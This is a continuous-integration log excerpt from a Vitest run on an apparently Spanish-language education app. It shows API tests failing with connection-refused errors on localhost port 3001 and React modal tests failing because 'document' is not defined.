2025-11-18T17:36:11.3352560Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/transformation/area-questions.test.ts[2m > [22mGET /api/transformation/area-questions[2m > [22mAprendizaje área[2m > [22mshould return 68 sections for aprendizaje
2025-11-18T17:36:11.3352951Z [31m[1mTypeError[22m: fetch failed[39m
2025-11-18T17:36:11.3353637Z [36m [2m❯[22m __tests__/api/transformation/area-questions.test.ts:[2m48:24[22m[39m
2025-11-18T17:36:11.3354004Z     [90m 46| [39m  describe('Aprendizaje área', () => {
2025-11-18T17:36:11.3354541Z     [90m 47| [39m    it('should return 68 sections for aprendizaje', async () => {
2025-11-18T17:36:11.3355122Z     [90m 48| [39m      const response = await fetch(`${API_BASE}/api/transformation/are…
2025-11-18T17:36:11.3355434Z     [90m   | [39m                       [31m^[39m
2025-11-18T17:36:11.3355631Z     [90m 49| [39m
2025-11-18T17:36:11.3356003Z     [90m 50| [39m      expect(response.ok).toBe(true);
2025-11-18T17:36:11.3356263Z 
2025-11-18T17:36:11.3357257Z [31m[1mCaused by: Error[22m: connect ECONNREFUSED ::1:3001[39m
2025-11-18T17:36:11.3358002Z [90m [2m❯[22m TCPConnectWrap.afterConnect [as oncomplete] node:net:[2m1555:16[22m[39m
2025-11-18T17:36:11.3358018Z 
2025-11-18T17:36:11.3358401Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[22m[39m
2025-11-18T17:36:11.3359500Z [31m[1mSerialized Error:[22m[39m [90m{ errno: -111, code: 'ECONNREFUSED', syscall: 'connect', address: '::1', port: 3001 }[39m
2025-11-18T17:36:11.3359890Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[238/545]⎯[22m[39m
2025-11-18T17:36:11.3359904Z 
2025-11-18T17:36:11.3361707Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/transformation/area-questions.test.ts[2m > [22mGET /api/transformation/area-questions[2m > [22mAprendizaje área[2m > [22mshould have 6 objetivos with correct distribution
2025-11-18T17:36:11.3362043Z [31m[1mTypeError[22m: fetch failed[39m
2025-11-18T17:36:11.3362701Z [36m [2m❯[22m __tests__/api/transformation/area-questions.test.ts:[2m64:24[22m[39m
2025-11-18T17:36:11.3362896Z     [90m 62| [39m
2025-11-18T17:36:11.3363430Z     [90m 63| [39m    it('should have 6 objetivos with correct distribution', async () =…
2025-11-18T17:36:11.3363976Z     [90m 64| [39m      const response = await fetch(`${API_BASE}/api/transformation/are…
2025-11-18T17:36:11.3364281Z     [90m   | [39m                       [31m^[39m
2025-11-18T17:36:11.3364852Z     [90m 65| [39m      const data = await response.json();
2025-11-18T17:36:11.3365044Z     [90m 66| [39m
2025-11-18T17:36:11.3365057Z 
2025-11-18T17:36:11.3365642Z [31m[1mCaused by: Error[22m: connect ECONNREFUSED ::1:3001[39m
2025-11-18T17:36:11.3366355Z [90m [2m❯[22m TCPConnectWrap.afterConnect [as oncomplete] node:net:[2m1555:16[22m[39m
2025-11-18T17:36:11.3366374Z 
2025-11-18T17:36:11.3367013Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[22m[39m
2025-11-18T17:36:11.3368135Z [31m[1mSerialized Error:[22m[39m [90m{ errno: -111, code: 'ECONNREFUSED', syscall: 'connect', address: '::1', port: 3001 }[39m
2025-11-18T17:36:11.3368543Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[239/545]⎯[22m[39m
2025-11-18T17:36:11.3368556Z 
2025-11-18T17:36:11.3370185Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/transformation/area-questions.test.ts[2m > [22mGET /api/transformation/area-questions[2m > [22mError handling[2m > [22mshould return 400 for invalid área
2025-11-18T17:36:11.3370538Z [31m[1mTypeError[22m: fetch failed[39m
2025-11-18T17:36:11.3371209Z [36m [2m❯[22m __tests__/api/transformation/area-questions.test.ts:[2m84:24[22m[39m
2025-11-18T17:36:11.3371547Z     [90m 82| [39m  describe('Error handling', () => {
2025-11-18T17:36:11.3371985Z     [90m 83| [39m    it('should return 400 for invalid área', async () => {
2025-11-18T17:36:11.3372527Z     [90m 84| [39m      const response = await fetch(`${API_BASE}/api/transformation/are…
2025-11-18T17:36:11.3372817Z     [90m   | [39m                       [31m^[39m
2025-11-18T17:36:11.3373009Z     [90m 85| [39m
2025-11-18T17:36:11.3373354Z     [90m 86| [39m      expect(response.status).toBe(400);
2025-11-18T17:36:11.3373366Z 
2025-11-18T17:36:11.3373942Z [31m[1mCaused by: Error[22m: connect ECONNREFUSED ::1:3001[39m
2025-11-18T17:36:11.3374648Z [90m [2m❯[22m TCPConnectWrap.afterConnect [as oncomplete] node:net:[2m1555:16[22m[39m
2025-11-18T17:36:11.3374661Z 
2025-11-18T17:36:11.3375052Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[22m[39m
2025-11-18T17:36:11.3376121Z [31m[1mSerialized Error:[22m[39m [90m{ errno: -111, code: 'ECONNREFUSED', syscall: 'connect', address: '::1', port: 3001 }[39m
2025-11-18T17:36:11.3376476Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[240/545]⎯[22m[39m
2025-11-18T17:36:11.3376488Z 
2025-11-18T17:36:11.3378383Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/transformation/area-questions.test.ts[2m > [22mGET /api/transformation/area-questions[2m > [22mError handling[2m > [22mshould return 400 when area parameter is missing
2025-11-18T17:36:11.3378751Z [31m[1mTypeError[22m: fetch failed[39m
2025-11-18T17:36:11.3379769Z [36m [2m❯[22m __tests__/api/transformation/area-questions.test.ts:[2m96:24[22m[39m
2025-11-18T17:36:11.3379970Z     [90m 94| [39m
2025-11-18T17:36:11.3380543Z     [90m 95| [39m    it('should return 400 when area parameter is missing', async () =>…
2025-11-18T17:36:11.3381133Z     [90m 96| [39m      const response = await fetch(`${API_BASE}/api/transformation/are…
2025-11-18T17:36:11.3381505Z     [90m   | [39m                       [31m^[39m
2025-11-18T17:36:11.3381722Z     [90m 97| [39m
2025-11-18T17:36:11.3382096Z     [90m 98| [39m      expect(response.status).toBe(400);
2025-11-18T17:36:11.3382111Z 
2025-11-18T17:36:11.3382687Z [31m[1mCaused by: Error[22m: connect ECONNREFUSED ::1:3001[39m
2025-11-18T17:36:11.3383400Z [90m [2m❯[22m TCPConnectWrap.afterConnect [as oncomplete] node:net:[2m1555:16[22m[39m
2025-11-18T17:36:11.3383427Z 
2025-11-18T17:36:11.3383861Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[22m[39m
2025-11-18T17:36:11.3385017Z [31m[1mSerialized Error:[22m[39m [90m{ errno: -111, code: 'ECONNREFUSED', syscall: 'connect', address: '::1', port: 3001 }[39m
2025-11-18T17:36:11.3385449Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[241/545]⎯[22m[39m
2025-11-18T17:36:11.3385466Z 
2025-11-18T17:36:11.3387575Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/transformation/area-questions.test.ts[2m > [22mGET /api/transformation/area-questions[2m > [22mError handling[2m > [22mshould return 405 for non-GET methods
2025-11-18T17:36:11.3387996Z [31m[1mTypeError[22m: fetch failed[39m
2025-11-18T17:36:11.3388731Z [36m [2m❯[22m __tests__/api/transformation/area-questions.test.ts:[2m105:24[22m[39m
2025-11-18T17:36:11.3388945Z     [90m103| [39m
2025-11-18T17:36:11.3389443Z     [90m104| [39m    it('should return 405 for non-GET methods', async () => {
2025-11-18T17:36:11.3390048Z     [90m105| [39m      const response = await fetch(`${API_BASE}/api/transformation/are…
2025-11-18T17:36:11.3390393Z     [90m   | [39m                       [31m^[39m
2025-11-18T17:36:11.3390733Z     [90m106| [39m        method: 'POST',
2025-11-18T17:36:11.3390938Z     [90m107| [39m      });
2025-11-18T17:36:11.3390952Z 
2025-11-18T17:36:11.3391545Z [31m[1mCaused by: Error[22m: connect ECONNREFUSED ::1:3001[39m
2025-11-18T17:36:11.3392253Z [90m [2m❯[22m TCPConnectWrap.afterConnect [as oncomplete] node:net:[2m1555:16[22m[39m
2025-11-18T17:36:11.3392270Z 
2025-11-18T17:36:11.3392698Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[22m[39m
2025-11-18T17:36:11.3393848Z [31m[1mSerialized Error:[22m[39m [90m{ errno: -111, code: 'ECONNREFUSED', syscall: 'connect', address: '::1', port: 3001 }[39m
2025-11-18T17:36:11.3394260Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[242/545]⎯[22m[39m
2025-11-18T17:36:11.3394278Z 
2025-11-18T17:36:11.3396215Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/transformation/area-questions.test.ts[2m > [22mGET /api/transformation/area-questions[2m > [22mData consistency[2m > [22mshould have exactly 4 sections per acción (Personalización)
2025-11-18T17:36:11.3396981Z [31m[1mTypeError[22m: fetch failed[39m
2025-11-18T17:36:11.3397709Z [36m [2m❯[22m __tests__/api/transformation/area-questions.test.ts:[2m118:24[22m[39m
2025-11-18T17:36:11.3398081Z     [90m116| [39m  describe('Data consistency', () => {
2025-11-18T17:36:11.3398664Z     [90m117| [39m    it('should have exactly 4 sections per acción (Personalización)', …
2025-11-18T17:36:11.3399235Z     [90m118| [39m      const response = await fetch(`${API_BASE}/api/transformation/are…
2025-11-18T17:36:11.3399536Z     [90m   | [39m                       [31m^[39m
2025-11-18T17:36:11.3399898Z     [90m119| [39m      const data = await response.json();
2025-11-18T17:36:11.3400078Z     [90m120| [39m
2025-11-18T17:36:11.3400091Z 
2025-11-18T17:36:11.3400683Z [31m[1mCaused by: Error[22m: connect ECONNREFUSED ::1:3001[39m
2025-11-18T17:36:11.3401396Z [90m [2m❯[22m TCPConnectWrap.afterConnect [as oncomplete] node:net:[2m1555:16[22m[39m
2025-11-18T17:36:11.3401423Z 
2025-11-18T17:36:11.3401806Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[22m[39m
2025-11-18T17:36:11.3402898Z [31m[1mSerialized Error:[22m[39m [90m{ errno: -111, code: 'ECONNREFUSED', syscall: 'connect', address: '::1', port: 3001 }[39m
2025-11-18T17:36:11.3403282Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[243/545]⎯[22m[39m
2025-11-18T17:36:11.3403295Z 
2025-11-18T17:36:11.3405342Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/transformation/area-questions.test.ts[2m > [22mGET /api/transformation/area-questions[2m > [22mData consistency[2m > [22mshould have exactly 4 sections per acción (Aprendizaje)
2025-11-18T17:36:11.3405710Z [31m[1mTypeError[22m: fetch failed[39m
2025-11-18T17:36:11.3406407Z [36m [2m❯[22m __tests__/api/transformation/area-questions.test.ts:[2m133:24[22m[39m
2025-11-18T17:36:11.3406598Z     [90m131| [39m
2025-11-18T17:36:11.3407300Z     [90m132| [39m    it('should have exactly 4 sections per acción (Aprendizaje)', asyn…
2025-11-18T17:36:11.3407841Z     [90m133| [39m      const response = await fetch(`${API_BASE}/api/transformation/are…
2025-11-18T17:36:11.3408139Z     [90m   | [39m                       [31m^[39m
2025-11-18T17:36:11.3408507Z     [90m134| [39m      const data = await response.json();
2025-11-18T17:36:11.3408680Z     [90m135| [39m
2025-11-18T17:36:11.3408693Z 
2025-11-18T17:36:11.3409264Z [31m[1mCaused by: Error[22m: connect ECONNREFUSED ::1:3001[39m
2025-11-18T17:36:11.3409980Z [90m [2m❯[22m TCPConnectWrap.afterConnect [as oncomplete] node:net:[2m1555:16[22m[39m
2025-11-18T17:36:11.3409994Z 
2025-11-18T17:36:11.3410375Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[22m[39m
2025-11-18T17:36:11.3411438Z [31m[1mSerialized Error:[22m[39m [90m{ errno: -111, code: 'ECONNREFUSED', syscall: 'connect', address: '::1', port: 3001 }[39m
2025-11-18T17:36:11.3411814Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[244/545]⎯[22m[39m
2025-11-18T17:36:11.3411835Z 
2025-11-18T17:36:11.3413479Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/assignments/GroupSubmissionModalV2.test.tsx[2m > [22mGroupSubmissionModalV2[2m > [22mBasic Rendering[2m > [22mrenders modal with assignment details
2025-11-18T17:36:11.3413957Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3414653Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3415552Z [36m [2m❯[22m __tests__/components/assignments/GroupSubmissionModalV2.test.tsx:[2m109:9[22m[39m
2025-11-18T17:36:11.3416083Z     [90m107| [39m    it('renders modal with assignment details', async () => {
2025-11-18T17:36:11.3416389Z     [90m108| [39m      await act(async () => {
2025-11-18T17:36:11.3416661Z     [90m109| [39m        render(
2025-11-18T17:36:11.3417132Z     [90m   | [39m        [31m^[39m
2025-11-18T17:36:11.3417517Z     [90m110| [39m          <GroupSubmissionModalV2
2025-11-18T17:36:11.3417916Z     [90m111| [39m            assignment={mockAssignment}
2025-11-18T17:36:11.3418619Z [90m [2m❯[22m node_modules/@testing-library/react/dist/act-compat.js:[2m48:24[22m[39m
2025-11-18T17:36:11.3419503Z [90m [2m❯[22m act node_modules/react/cjs/react.development.js:[2m2512:16[22m[39m
2025-11-18T17:36:11.3420216Z [90m [2m❯[22m node_modules/@testing-library/react/dist/act-compat.js:[2m47:25[22m[39m
2025-11-18T17:36:11.3421115Z [90m [2m❯[22m __tests__/components/assignments/GroupSubmissionModalV2.test.tsx:[2m108:13[22m[39m
2025-11-18T17:36:11.3421133Z 
2025-11-18T17:36:11.3421537Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[245/545]⎯[22m[39m
2025-11-18T17:36:11.3421555Z 
2025-11-18T17:36:11.3423262Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/assignments/GroupSubmissionModalV2.test.tsx[2m > [22mGroupSubmissionModalV2[2m > [22mBasic Rendering[2m > [22mshows loading state initially
2025-11-18T17:36:11.3423739Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3424450Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3425334Z [36m [2m❯[22m __tests__/components/assignments/GroupSubmissionModalV2.test.tsx:[2m128:9[22m[39m
2025-11-18T17:36:11.3425807Z     [90m126| [39m    it('shows loading state initially', async () => {
2025-11-18T17:36:11.3426126Z     [90m127| [39m      await act(async () => {
2025-11-18T17:36:11.3426395Z     [90m128| [39m        render(
2025-11-18T17:36:11.3427108Z     [90m   | [39m        [31m^[39m
2025-11-18T17:36:11.3427530Z     [90m129| [39m          <GroupSubmissionModalV2
2025-11-18T17:36:11.3427884Z     [90m130| [39m            assignment={mockAssignment}
2025-11-18T17:36:11.3428581Z [90m [2m❯[22m node_modules/@testing-library/react/dist/act-compat.js:[2m48:24[22m[39m
2025-11-18T17:36:11.3429230Z [90m [2m❯[22m act node_modules/react/cjs/react.development.js:[2m2512:16[22m[39m
2025-11-18T17:36:11.3429958Z [90m [2m❯[22m node_modules/@testing-library/react/dist/act-compat.js:[2m47:25[22m[39m
2025-11-18T17:36:11.3430825Z [90m [2m❯[22m __tests__/components/assignments/GroupSubmissionModalV2.test.tsx:[2m127:13[22m[39m
2025-11-18T17:36:11.3430865Z 
2025-11-18T17:36:11.3431291Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[246/545]⎯[22m[39m
2025-11-18T17:36:11.3431307Z 
2025-11-18T17:36:11.3433084Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/assignments/GroupSubmissionModalV2.test.tsx[2m > [22mGroupSubmissionModalV2[2m > [22mBasic Rendering[2m > [22mdisplays group members after loading
2025-11-18T17:36:11.3433547Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3434285Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3435171Z [36m [2m❯[22m __tests__/components/assignments/GroupSubmissionModalV2.test.tsx:[2m148:9[22m[39m
2025-11-18T17:36:11.3435680Z     [90m146| [39m    it('displays group members after loading', async () => {
2025-11-18T17:36:11.3436010Z     [90m147| [39m      await act(async () => {
2025-11-18T17:36:11.3436286Z     [90m148| [39m        render(
2025-11-18T17:36:11.3436545Z     [90m   | [39m        [31m^[39m
2025-11-18T17:36:11.3437087Z     [90m149| [39m          <GroupSubmissionModalV2
2025-11-18T17:36:11.3437552Z     [90m150| [39m            assignment={mockAssignment}
2025-11-18T17:36:11.3438304Z [90m [2m❯[22m node_modules/@testing-library/react/dist/act-compat.js:[2m48:24[22m[39m
2025-11-18T17:36:11.3438980Z [90m [2m❯[22m act node_modules/react/cjs/react.development.js:[2m2512:16[22m[39m
2025-11-18T17:36:11.3439661Z [90m [2m❯[22m node_modules/@testing-library/react/dist/act-compat.js:[2m47:25[22m[39m
2025-11-18T17:36:11.3440495Z [90m [2m❯[22m __tests__/components/assignments/GroupSubmissionModalV2.test.tsx:[2m147:13[22m[39m
2025-11-18T17:36:11.3440512Z 
2025-11-18T17:36:11.3440904Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[247/545]⎯[22m[39m
2025-11-18T17:36:11.3440918Z 
2025-11-18T17:36:11.3442683Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/assignments/GroupSubmissionModalV2.test.tsx[2m > [22mGroupSubmissionModalV2[2m > [22mResources Display[2m > [22mshows resources section when resources exist
2025-11-18T17:36:11.3443371Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3444059Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3444902Z [36m [2m❯[22m __tests__/components/assignments/GroupSubmissionModalV2.test.tsx:[2m167:7[22m[39m
2025-11-18T17:36:11.3445266Z     [90m165| [39m  describe('Resources Display', () => {
2025-11-18T17:36:11.3445801Z     [90m166| [39m    it('shows resources section when resources exist', async () => {
2025-11-18T17:36:11.3446035Z     [90m167| [39m      render(
2025-11-18T17:36:11.3446281Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.3446606Z     [90m168| [39m        <GroupSubmissionModalV2
2025-11-18T17:36:11.3447230Z     [90m169| [39m          assignment={mockAssignmentWithResources}
2025-11-18T17:36:11.3447253Z 
2025-11-18T17:36:11.3447648Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[248/545]⎯[22m[39m
2025-11-18T17:36:11.3447661Z 
2025-11-18T17:36:11.3449485Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/assignments/GroupSubmissionModalV2.test.tsx[2m > [22mGroupSubmissionModalV2[2m > [22mResources Display[2m > [22mdisplays all resources with correct information
2025-11-18T17:36:11.3449949Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3450849Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3451691Z [36m [2m❯[22m __tests__/components/assignments/GroupSubmissionModalV2.test.tsx:[2m182:7[22m[39m
2025-11-18T17:36:11.3451888Z     [90m180| [39m
2025-11-18T17:36:11.3452463Z     [90m181| [39m    it('displays all resources with correct information', async () => {
2025-11-18T17:36:11.3452698Z     [90m182| [39m      render(
2025-11-18T17:36:11.3452938Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.3453259Z     [90m183| [39m        <GroupSubmissionModalV2
2025-11-18T17:36:11.3453708Z     [90m184| [39m          assignment={mockAssignmentWithResources}
2025-11-18T17:36:11.3453723Z 
2025-11-18T17:36:11.3454094Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[249/545]⎯[22m[39m
2025-11-18T17:36:11.3454107Z 
2025-11-18T17:36:11.3455881Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/assignments/GroupSubmissionModalV2.test.tsx[2m > [22mGroupSubmissionModalV2[2m > [22mResources Display[2m > [22mrenders correct icons for resource types
2025-11-18T17:36:11.3456336Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3457249Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3458157Z [36m [2m❯[22m __tests__/components/assignments/GroupSubmissionModalV2.test.tsx:[2m200:7[22m[39m
2025-11-18T17:36:11.3458397Z     [90m198| [39m
2025-11-18T17:36:11.3458922Z     [90m199| [39m    it('renders correct icons for resource types', async () => {
2025-11-18T17:36:11.3459172Z     [90m200| [39m      render(
2025-11-18T17:36:11.3459412Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.3459732Z     [90m201| [39m        <GroupSubmissionModalV2
2025-11-18T17:36:11.3460168Z     [90m202| [39m          assignment={mockAssignmentWithResources}
2025-11-18T17:36:11.3460184Z 
2025-11-18T17:36:11.3460589Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[250/545]⎯[22m[39m
2025-11-18T17:36:11.3460606Z 
2025-11-18T17:36:11.3462503Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/assignments/GroupSubmissionModalV2.test.tsx[2m > [22mGroupSubmissionModalV2[2m > [22mResources Display[2m > [22mmakes resources clickable with correct attributes
2025-11-18T17:36:11.3463029Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3463770Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3464582Z [36m [2m❯[22m __tests__/components/assignments/GroupSubmissionModalV2.test.tsx:[2m219:7[22m[39m
2025-11-18T17:36:11.3465007Z     [90m217| [39m
2025-11-18T17:36:11.3465618Z     [90m218| [39m    it('makes resources clickable with correct attributes', async () =…
2025-11-18T17:36:11.3465884Z     [90m219| [39m      render(
2025-11-18T17:36:11.3466140Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.3466471Z     [90m220| [39m        <GroupSubmissionModalV2
2025-11-18T17:36:11.3467131Z     [90m221| [39m          assignment={mockAssignmentWithResources}
2025-11-18T17:36:11.3467154Z 
2025-11-18T17:36:11.3467578Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[251/545]⎯[22m[39m
2025-11-18T17:36:11.3467596Z 
2025-11-18T17:36:11.3469481Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/assignments/GroupSubmissionModalV2.test.tsx[2m > [22mGroupSubmissionModalV2[2m > [22mResources Display[2m > [22mdoes not show resources section when no resources
2025-11-18T17:36:11.3469949Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3470697Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3471570Z [36m [2m❯[22m __tests__/components/assignments/GroupSubmissionModalV2.test.tsx:[2m242:7[22m[39m
2025-11-18T17:36:11.3471791Z     [90m240| [39m
2025-11-18T17:36:11.3472380Z     [90m241| [39m    it('does not show resources section when no resources', async () =…
2025-11-18T17:36:11.3472663Z     [90m242| [39m      render(
2025-11-18T17:36:11.3473123Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.3473449Z     [90m243| [39m        <GroupSubmissionModalV2
2025-11-18T17:36:11.3473796Z     [90m244| [39m          assignment={mockAssignment}
2025-11-18T17:36:11.3473809Z 
2025-11-18T17:36:11.3474176Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[252/545]⎯[22m[39m
2025-11-18T17:36:11.3474188Z 
2025-11-18T17:36:11.3475964Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/assignments/GroupSubmissionModalV2.test.tsx[2m > [22mGroupSubmissionModalV2[2m > [22mResources Display[2m > [22mhandles resources without descriptions
2025-11-18T17:36:11.3476489Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3477444Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3478338Z [36m [2m❯[22m __tests__/components/assignments/GroupSubmissionModalV2.test.tsx:[2m269:7[22m[39m
2025-11-18T17:36:11.3478557Z     [90m267| [39m      };
2025-11-18T17:36:11.3478743Z     [90m268| [39m
2025-11-18T17:36:11.3478976Z     [90m269| [39m      render(
2025-11-18T17:36:11.3479208Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.3479517Z     [90m270| [39m        <GroupSubmissionModalV2
2025-11-18T17:36:11.3479973Z     [90m271| [39m          assignment={assignmentWithMinimalResources}
2025-11-18T17:36:11.3479990Z 
2025-11-18T17:36:11.3480397Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[253/545]⎯[22m[39m
2025-11-18T17:36:11.3480413Z 
2025-11-18T17:36:11.3482247Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/assignments/GroupSubmissionModalV2.test.tsx[2m > [22mGroupSubmissionModalV2[2m > [22mResources Display[2m > [22mshows "Sin título" for resources without title
2025-11-18T17:36:11.3482780Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3483486Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3484252Z [36m [2m❯[22m __tests__/components/assignments/GroupSubmissionModalV2.test.tsx:[2m299:7[22m[39m
2025-11-18T17:36:11.3484438Z     [90m297| [39m      };
2025-11-18T17:36:11.3484624Z     [90m298| [39m
2025-11-18T17:36:11.3484862Z     [90m299| [39m      render(
2025-11-18T17:36:11.3485074Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.3485323Z     [90m300| [39m        <GroupSubmissionModalV2
2025-11-18T17:36:11.3485673Z     [90m301| [39m          assignment={assignmentWithUntitledResource}
2025-11-18T17:36:11.3485684Z 
2025-11-18T17:36:11.3485970Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[254/545]⎯[22m[39m
2025-11-18T17:36:11.3486195Z 
2025-11-18T17:36:11.3488173Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/assignments/GroupSubmissionModalV2.test.tsx[2m > [22mGroupSubmissionModalV2[2m > [22mSubmission Functionality[2m > [22menables submit button when content is provided
2025-11-18T17:36:11.3488585Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3489240Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3489970Z [36m [2m❯[22m __tests__/components/assignments/GroupSubmissionModalV2.test.tsx:[2m316:7[22m[39m
2025-11-18T17:36:11.3490383Z     [90m314| [39m  describe('Submission Functionality', () => {
2025-11-18T17:36:11.3490892Z     [90m315| [39m    it('enables submit button when content is provided', async () => {
2025-11-18T17:36:11.3491094Z     [90m316| [39m      render(
2025-11-18T17:36:11.3491294Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.3491575Z     [90m317| [39m        <GroupSubmissionModalV2
2025-11-18T17:36:11.3491884Z     [90m318| [39m          assignment={mockAssignment}
2025-11-18T17:36:11.3491897Z 
2025-11-18T17:36:11.3492272Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[255/545]⎯[22m[39m
2025-11-18T17:36:11.3492284Z 
2025-11-18T17:36:11.3494237Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/assignments/GroupSubmissionModalV2.test.tsx[2m > [22mGroupSubmissionModalV2[2m > [22mSubmission Functionality[2m > [22mhandles submission with success
2025-11-18T17:36:11.3494793Z [31m[1mReferenceError[22m: document is not defined[39m
